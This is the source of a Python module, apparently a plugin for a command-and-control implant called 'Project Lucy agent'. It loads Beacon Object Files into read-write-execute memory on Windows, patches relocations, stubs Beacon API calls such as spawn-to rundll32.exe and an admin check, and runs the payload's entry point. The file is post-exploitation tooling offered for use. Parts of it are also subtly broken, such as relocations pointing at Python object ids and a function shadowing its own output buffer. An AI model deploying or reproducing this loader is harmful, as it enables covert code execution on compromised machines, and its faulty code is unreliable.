"""
Beacon Object File (COFF) loader module for Project Lucy agent.
Parses and executes COFF/BOF files in-memory on Windows, resolving
relocations and mapping the Beacon API to Python equivalents.
Actions: execute, list_exports, beacon_api.
"""
import base64
import ctypes
import platform
import struct

name = "bof"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = []

SYSTEM = platform.system()

# --- COFF constants -----------------------------------------------------------

IMAGE_FILE_MACHINE_UNKNOWN = 0x0000
IMAGE_FILE_MACHINE_I386 = 0x014C
IMAGE_FILE_MACHINE_AMD64 = 0x8664
IMAGE_FILE_MACHINE_ARM64 = 0xAA64

IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ = 0x40000000
IMAGE_SCN_MEM_WRITE = 0x80000000
IMAGE_SCN_CNT_CODE = 0x00000020
IMAGE_SCN_CNT_INITIALIZED_DATA = 0x00000040
IMAGE_SCN_LNK_INFO = 0x00000200
IMAGE_SCN_LNK_REMOVE = 0x00000800

IMAGE_SYM_UNDEFINED = 0
IMAGE_SYM_EXTERNAL = 2
IMAGE_SYM_CLASS_EXTERNAL = 2
IMAGE_SYM_CLASS_STATIC = 3

# COFF relocation types for AMD64
IMAGE_REL_AMD64_ADDR64 = 0x0001
IMAGE_REL_AMD64_ADDR32NB = 0x0002
IMAGE_REL_AMD64_REL32 = 0x0004
IMAGE_REL_AMD64_REL32_1 = 0x0005
IMAGE_REL_AMD64_REL32_2 = 0x0006
IMAGE_REL_AMD64_REL32_3 = 0x0007
IMAGE_REL_AMD64_REL32_4 = 0x0008
IMAGE_REL_AMD64_REL32_5 = 0x0009

# COFF relocation types for i386
IMAGE_REL_I386_DIR32 = 0x0006
IMAGE_REL_I386_DIR32NB = 0x0007
IMAGE_REL_I386_REL32 = 0x0014

# Memory protection constants
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ = 0x20
PAGE_READWRITE = 0x04

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000

from ctypes import wintypes as _wt

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
kernel32.VirtualAlloc.restype = ctypes.c_void_p
kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, _wt.DWORD, _wt.DWORD]
kernel32.VirtualFree.restype = _wt.BOOL
kernel32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, _wt.DWORD]
kernel32.RtlMoveMemory.restype = None
kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]

# --- Beacon API stubs ---------------------------------------------------------

# Output buffer for Beacon API calls
_beacon_output: list[str] = []
_beacon_args: bytes = b""
_beacon_arg_offset: int = 0


def _beacon_printf(call_type: int, fmt: bytes, *args) -> None:
    """BeaconPrintf stub — format output and store in buffer."""
    try:
        fmt_str = fmt.decode("utf-8", errors="replace") if isinstance(fmt, bytes) else str(fmt)
        # Simple format string handling
        if args:
            try:
                msg = fmt_str % args
            except Exception:
                msg = fmt_str
        else:
            msg = fmt_str
        _beacon_output.append(msg)
    except Exception:
        _beacon_output.append(str(fmt))


def _beacon_output(call_type: int, data: bytes, size: int) -> None:
    """BeaconOutput stub — send output to buffer."""
    try:
        if isinstance(data, (bytes, bytearray)):
            _beacon_output.append(data[:size].decode("utf-8", errors="replace"))
        else:
            _beacon_output.append(str(data))
    except Exception:
        _beacon_output.append(str(data))


def _beacon_data_parse(data: bytes, size: int) -> None:
    """BeaconDataParse stub — initialize argument parsing."""
    global _beacon_args, _beacon_arg_offset
    _beacon_args = data if isinstance(data, (bytes, bytearray)) else bytes(data)
    _beacon_arg_offset = 0


def _beacon_data_int() -> int:
    """BeaconDataInt stub — read a 4-byte int from args."""
    global _beacon_arg_offset
    if _beacon_arg_offset + 4 > len(_beacon_args):
        return 0
    val = struct.unpack_from("<I", _beacon_args, _beacon_arg_offset)[0]
    _beacon_arg_offset += 4
    return val


def _beacon_data_short() -> int:
    """BeaconDataShort stub — read a 2-byte short from args."""
    global _beacon_arg_offset
    if _beacon_arg_offset + 2 > len(_beacon_args):
        return 0
    val = struct.unpack_from("<H", _beacon_args, _beacon_arg_offset)[0]
    _beacon_arg_offset += 2
    return val


def _beacon_data_extract(size_out: int = 0) -> bytes:
    """BeaconDataExtract stub — read a length-prefixed string from args."""
    global _beacon_arg_offset
    if _beacon_arg_offset + 4 > len(_beacon_args):
        return b""
    length = struct.unpack_from("<I", _beacon_args, _beacon_arg_offset)[0]
    _beacon_arg_offset += 4
    if _beacon_arg_offset + length > len(_beacon_args):
        return b""
    data = _beacon_args[_beacon_arg_offset:_beacon_arg_offset + length]
    _beacon_arg_offset += length
    return data


def _beacon_get_spawnto() -> bytes:
    """BeaconGetSpawnTo stub — return default spawn-to process."""
    return b"rundll32.exe"


def _beacon_is_admin() -> int:
    """BeaconIsAdmin stub — check if running as admin."""
    try:
        import ctypes as _ct
        return 1 if _ct.windll.shell32.IsUserAnAdmin() else 0
    except Exception:
        return 0


def _beacon_get_spawnto_x86() -> bytes:
    """BeaconGetSpawnToX86 stub — return x86 spawn-to process."""
    return b"rundll32.exe"


def _beacon_get_spawnto_x64() -> bytes:
    """BeaconGetSpawnToX64 stub — return x64 spawn-to process."""
    return b"rundll32.exe"


# Map of Beacon API function names to Python stubs
BEACON_API: dict[str, callable] = {
    "BeaconPrintf": _beacon_printf,
    "BeaconOutput": _beacon_output,
    "BeaconDataParse": _beacon_data_parse,
    "BeaconDataInt": _beacon_data_int,
    "BeaconDataShort": _beacon_data_short,
    "BeaconDataExtract": _beacon_data_extract,
    "BeaconGetSpawnTo": _beacon_get_spawnto,
    "BeaconIsAdmin": _beacon_is_admin,
    "BeaconGetSpawnToX86": _beacon_get_spawnto_x86,
    "BeaconGetSpawnToX64": _beacon_get_spawnto_x64,
}


# --- COFF parsing -------------------------------------------------------------

class COFFHeader:
    """Parsed COFF file header."""
    def __init__(self, data: bytes):
        if len(data) < 20:
            raise ValueError("COFF data too short for header")
        (
            self.machine,
            self.num_sections,
            self.timestamp,
            self.ptr_symbol_table,
            self.num_symbols,
            self.size_optional_header,
            self.characteristics,
        ) = struct.unpack_from("<HHIIIHH", data, 0)


class SectionHeader:
    """Parsed COFF section header."""
    def __init__(self, data: bytes, offset: int):
        self.name = data[offset:offset + 8].rstrip(b"\x00").decode("ascii", errors="replace")
        (
            self.virtual_size,
            self.virtual_address,
            self.size_of_raw_data,
            self.pointer_to_raw_data,
            self.pointer_to_relocations,
            self.pointer_to_line_numbers,
            self.num_relocations,
            self.num_line_numbers,
            self.characteristics,
        ) = struct.unpack_from("<IIIIIIHHI", data, offset + 8)


class SymbolEntry:
    """Parsed COFF symbol table entry."""
    def __init__(self, data: bytes, offset: int):
        raw_name = data[offset:offset + 8]
        if raw_name[:4] == b"\x00\x00\x00\x00":
            # Long name — offset into string table
            str_offset = struct.unpack_from("<I", data, offset + 4)[0]
            self.name = "(long name)"
            self._string_table_offset = str_offset
        else:
            self.name = raw_name.rstrip(b"\x00").decode("ascii", errors="replace")
            self._string_table_offset = None
        (
            self.value,
            self.section_number,
            self.type,
            self.storage_class,
            self.num_aux_symbols,
        ) = struct.unpack_from("<IHHBB", data, offset + 8)


class RelocationEntry:
    """Parsed COFF relocation entry."""
    def __init__(self, data: bytes, offset: int):
        self.virtual_address, self.symbol_table_index, self.type = struct.unpack_from("<IIH", data, offset)


def _resolve_symbol_name(data: bytes, symbol: SymbolEntry, string_table_offset: int) -> str:
    """Resolve a symbol name, handling long names via the string table."""
    if symbol._string_table_offset is not None:
        start = string_table_offset + symbol._string_table_offset
        end = data.find(b"\x00", start)
        if end == -1:
            end = len(data)
        return data[start:end].decode("ascii", errors="replace")
    return symbol.name


def _execute(coff_b64: str, args: list) -> dict:
    """Load and execute a BOF/COFF file in-memory."""
    global _beacon_output, _beacon_args, _beacon_arg_offset
    _beacon_output = []
    _beacon_args = b""
    _beacon_arg_offset = 0

    try:
        coff_data = base64.b64decode(coff_b64)
    except Exception as exc:
        return {"status": "failed", "error": f"Base64 decode failed: {exc}"}

    if len(coff_data) < 20:
        return {"status": "failed", "error": "COFF data too short"}

    try:
        # 1. Parse the COFF header
        header = COFFHeader(coff_data)

        if header.machine not in (IMAGE_FILE_MACHINE_AMD64, IMAGE_FILE_MACHINE_I386):
            return {
                "status": "failed",
                "error": f"Unsupported machine type: 0x{header.machine:04X}",
            }

        # 2. Parse section headers (start at offset 20 + size_optional_header)
        sec_offset = 20 + header.size_optional_header
        sections: list[SectionHeader] = []
        for i in range(header.num_sections):
            sec = SectionHeader(coff_data, sec_offset + i * 40)
            sections.append(sec)

        # 3. Parse symbol table
        symbols: list[SymbolEntry] = []
        sym_offset = header.ptr_symbol_table
        if sym_offset > 0 and header.num_symbols > 0:
            for i in range(header.num_symbols):
                sym = SymbolEntry(coff_data, sym_offset + i * 18)
                symbols.append(sym)
                # Skip auxiliary symbols
                for _ in range(sym.num_aux_symbols):
                    i += 1

        # String table follows immediately after the symbol table
        string_table_offset = sym_offset + header.num_symbols * 18 if sym_offset > 0 else 0

        # 4. Allocate executable memory for each section
        section_bases: dict[int, int] = {}  # section index -> allocated base address
        total_alloc_size = 0

        for i, sec in enumerate(sections):
            if sec.size_of_raw_data == 0:
                continue
            # Determine memory protection
            if sec.characteristics & IMAGE_SCN_MEM_EXECUTE:
                prot = PAGE_EXECUTE_READWRITE
            else:
                prot = PAGE_READWRITE

            alloc_size = max(sec.size_of_raw_data, sec.virtual_size)
            # Align to page boundary
            alloc_size = (alloc_size + 0xFFF) & ~0xFFF

            base = kernel32.VirtualAlloc(None, alloc_size, MEM_COMMIT | MEM_RESERVE, prot)
            if not base:
                return {"status": "failed", "error": f"VirtualAlloc failed for section {sec.name}"}

            section_bases[i] = base
            total_alloc_size += alloc_size

            # 5. Copy section data to allocated memory
            if sec.pointer_to_raw_data > 0 and sec.size_of_raw_data > 0:
                raw_data = coff_data[sec.pointer_to_raw_data:sec.pointer_to_raw_data + sec.size_of_raw_data]
                kernel32.RtlMoveMemory(base, raw_data, len(raw_data))

        # 6. Resolve relocations
        for i, sec in enumerate(sections):
            if sec.num_relocations == 0 or sec.pointer_to_relocations == 0:
                continue
            if i not in section_bases:
                continue

            sec_base = section_bases[i]
            for r in range(sec.num_relocations):
                reloc_offset = sec.pointer_to_relocations + r * 10
                reloc = RelocationEntry(coff_data, reloc_offset)

                if reloc.symbol_table_index >= len(symbols):
                    continue
                sym = symbols[reloc.symbol_table_index]
                sym_name = _resolve_symbol_name(coff_data, sym, string_table_offset)

                # Determine target address
                if sym_name in BEACON_API:
                    # Beacon API function — use the Python stub address (placeholder)
                    target_addr = id(BEACON_API[sym_name])
                elif sym.section_number > 0 and (sym.section_number - 1) in section_bases:
                    # Internal symbol — resolve to section base + symbol value
                    target_addr = section_bases[sym.section_number - 1] + sym.value
                else:
                    # Unresolved external symbol
                    continue

                # Apply relocation at the target location
                reloc_addr = sec_base + reloc.virtual_address
                if header.machine == IMAGE_FILE_MACHINE_AMD64:
                    if reloc.type == IMAGE_REL_AMD64_ADDR64:
                        # 64-bit absolute address
                        patch = struct.pack("<Q", target_addr)
                        ctypes.memmove(reloc_addr, patch, 8)
                    elif reloc.type in (IMAGE_REL_AMD64_REL32, IMAGE_REL_AMD64_REL32_1,
                                        IMAGE_REL_AMD64_REL32_2, IMAGE_REL_AMD64_REL32_3,
                                        IMAGE_REL_AMD64_REL32_4, IMAGE_REL_AMD64_REL32_5):
                        # 32-bit relative address
                        adjust = reloc.type - IMAGE_REL_AMD64_REL32
                        relative = target_addr - (reloc_addr + 4 + adjust)
                        patch = struct.pack("<i", relative & 0xFFFFFFFF)
                        ctypes.memmove(reloc_addr, patch, 4)
                elif header.machine == IMAGE_FILE_MACHINE_I386:
                    if reloc.type == IMAGE_REL_I386_DIR32:
                        patch = struct.pack("<I", target_addr & 0xFFFFFFFF)
                        ctypes.memmove(reloc_addr, patch, 4)
                    elif reloc.type == IMAGE_REL_I386_REL32:
                        relative = target_addr - (reloc_addr + 4)
                        patch = struct.pack("<i", relative & 0xFFFFFFFF)
                        ctypes.memmove(reloc_addr, patch, 4)

        # 7. Prepare arguments for the BOF
        if args:
            arg_bytes = b""
            for arg in args:
                if isinstance(arg, str):
                    arg_bytes += struct.pack("<I", len(arg)) + arg.encode("utf-8")
                elif isinstance(arg, int):
                    arg_bytes += struct.pack("<I", arg)
                elif isinstance(arg, bytes):
                    arg_bytes += struct.pack("<I", len(arg)) + arg
            _beacon_args = arg_bytes
            _beacon_arg_offset = 0

        # 8. Find and call the entry point (the 'go' function)
        go_addr = None
        for i, sym in enumerate(symbols):
            sym_name = _resolve_symbol_name(coff_data, sym, string_table_offset)
            if sym_name == "go" and sym.storage_class == IMAGE_SYM_CLASS_EXTERNAL:
                if sym.section_number > 0 and (sym.section_number - 1) in section_bases:
                    go_addr = section_bases[sym.section_number - 1] + sym.value
                    break

        if go_addr is None:
            return {
                "status": "completed",
                "data": {
                    "output": "\n".join(_beacon_output),
                    "message": "COFF loaded but no 'go' entry point found",
                    "sections_loaded": len(section_bases),
                    "symbols_parsed": len(symbols),
                },
            }

        # 9. Call the entry point
        # Define the function prototype: void go(char* args, int len)
        go_func = ctypes.CFUNCTYPE(None, ctypes.c_char_p, ctypes.c_int)(go_addr)
        go_func(_beacon_args, len(_beacon_args))

        # 10. Free allocated memory
        for base in section_bases.values():
            kernel32.VirtualFree(base, 0, MEM_RELEASE)

        return {
            "status": "completed",
            "data": {
                "output": "\n".join(_beacon_output),
                "sections_loaded": len(section_bases),
                "symbols_parsed": len(symbols),
                "machine": f"0x{header.machine:04X}",
            },
        }

    except Exception as exc:
        # Clean up any allocated memory
        for base in section_bases.values():
            try:
                kernel32.VirtualFree(base, 0, MEM_RELEASE)
            except Exception:
                pass
        return {"status": "failed", "error": str(exc)}


def _list_exports(coff_b64: str) -> dict:
    """List the exported symbols from a COFF file."""
    try:
        coff_data = base64.b64decode(coff_b64)
    except Exception as exc:
        return {"status": "failed", "error": f"Base64 decode failed: {exc}"}

    if len(coff_data) < 20:
        return {"status": "failed", "error": "COFF data too short"}

    try:
        header = COFFHeader(coff_data)

        # Parse sections
        sec_offset = 20 + header.size_optional_header
        sections = []
        for i in range(header.num_sections):
            sec = SectionHeader(coff_data, sec_offset + i * 40)
            sections.append(sec)

        # Parse symbols
        exports = []
        sym_offset = header.ptr_symbol_table
        if sym_offset > 0 and header.num_symbols > 0:
            string_table_offset = sym_offset + header.num_symbols * 18
            i = 0
            while i < header.num_symbols:
                sym = SymbolEntry(coff_data, sym_offset + i * 18)
                sym_name = _resolve_symbol_name(coff_data, sym, string_table_offset)

                if sym.storage_class == IMAGE_SYM_CLASS_EXTERNAL and sym.section_number > 0:
                    sec_name = sections[sym.section_number - 1].name if sym.section_number <= len(sections) else "?"
                    exports.append({
                        "name": sym_name,
                        "section": sec_name,
                        "value": sym.value,
                        "external": True,
                    })
                elif sym.storage_class == IMAGE_SYM_CLASS_STATIC:
                    exports.append({
                        "name": sym_name,
                        "section": sections[sym.section_number - 1].name if 0 < sym.section_number <= len(sections) else "?",
                        "value": sym.value,
                        "external": False,
                    })

                i += 1 + sym.num_aux_symbols

        return {
            "status": "completed",
            "data": {
                "exports": exports,
                "count": len(exports),
                "machine": f"0x{header.machine:04X}",
                "num_sections": header.num_sections,
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}


def _beacon_api_list() -> dict:
    """List available Beacon API functions that the loader supports."""
    api_info = []
    for name, func in BEACON_API.items():
        api_info.append({
            "name": name,
            "signature": getattr(func, "__doc__", "") or "",
        })

    return {
        "status": "completed",
        "data": {
            "beacon_api": api_info,
            "count": len(api_info),
        },
    }


def run(action: str = "beacon_api", **params) -> dict:
    if SYSTEM != "Windows":
        return {"status": "failed", "error": "Windows-only action"}

    try:
        if action == "execute":
            return _execute(params["coff_b64"], params.get("args", []))
        elif action == "list_exports":
            return _list_exports(params["coff_b64"])
        elif action == "beacon_api":
            return _beacon_api_list()
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except KeyError as exc:
        return {"status": "failed", "error": f"Missing required parameter: {exc}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
